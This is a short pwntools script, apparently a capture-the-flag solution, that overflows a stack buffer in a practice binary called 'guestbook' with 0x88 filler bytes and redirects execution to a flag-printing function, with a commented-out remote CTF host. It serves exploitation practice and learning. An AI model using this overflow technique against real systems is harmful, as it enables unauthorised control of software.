from pwn import *
context.log_level = 'debug'
io = process('./guestbook')
# io = remote('node4.buuoj.cn',29103)

elf = ELF('./guestbook')


flag_fun_addr = 0x400620
ret_addr = 0x400669
payload = b'a'*0x88 + p64(flag_fun_addr)
print(payload)
# gdb.attach(io,'b *0x40051E\nc\n')
# gdb.attach(io)
# pause()


io.sendline(payload)
io.interactive()
